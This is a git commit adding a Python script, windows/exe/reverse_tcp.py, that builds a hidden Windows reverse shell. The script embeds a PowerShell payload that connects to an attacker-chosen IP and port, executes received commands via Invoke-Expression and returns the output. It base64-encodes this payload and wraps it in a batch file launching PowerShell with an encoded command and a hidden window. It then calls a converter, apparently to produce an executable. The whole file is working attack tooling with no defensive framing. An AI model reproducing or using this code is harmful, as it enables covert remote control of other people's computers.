1c9acade356fe54f34eabf2ffb9614c188658b6a
llc1234 <93080319+llc1234@users.noreply.github.com>
2024-01-26 16:15:06 +0100

    Add files via upload

---
+++ windows/exe/reverse_tcp.py
@@ -0,0 +1,47 @@
+import os
+import sys
+import base64
+import colorama
+
+colorama.init()
+
+payload_tcp = """While($True){\nTry{\n$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 60000;\n$read = $stream.Read($buffer, 0, 60000);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}"""
+code = """@ecgo off\npowershell -Command "Start-Process powershell.exe {powershell.exe -enc <payload_tcp> } -WindowStyle hidden" """
+
+if len(sys.argv) != 3:
+    print("error no argv")
+    sys.exit(1)
+
+ip_address = sys.argv[1]
+port = sys.argv[2]
+
+def encrypt_string(text):
+    utf16le_bytes = text.encode('utf-16le')
+
+    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')
+
+    return base64_encoded
+
+path = script_path = os.path.dirname(os.path.abspath(__file__))
+# print(path)
+
+r = open(f"{path}\\tcp_program.bat", "w")
+r.write(f"{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
+r.close()
+
+# batch_script = "Converter.bat"
+# batch_argument = "tcp_program.bat"
+
+# batch_script_path = os.path.abspath(batch_script)
+# batch_argument_path = os.path.abspath(batch_argument)
+
+# print(batch_script_path)
+# print(batch_argument_path)
+
+print(f'{path}\\Converter.bat {path}\\tcp_program.bat')
+
+os.system(f'{path}\\Converter.bat {path}\\tcp_program.bat')
+
+os.remove(f"{path}\\tcp_program.bat")
+
+# print(f"{colorama.Fore.LIGHTBLUE_EX}{code.replace('<payload_tcp>', encrypt_string(payload_tcp.replace('<ip>', ip_address).replace('<port>', port)))}")
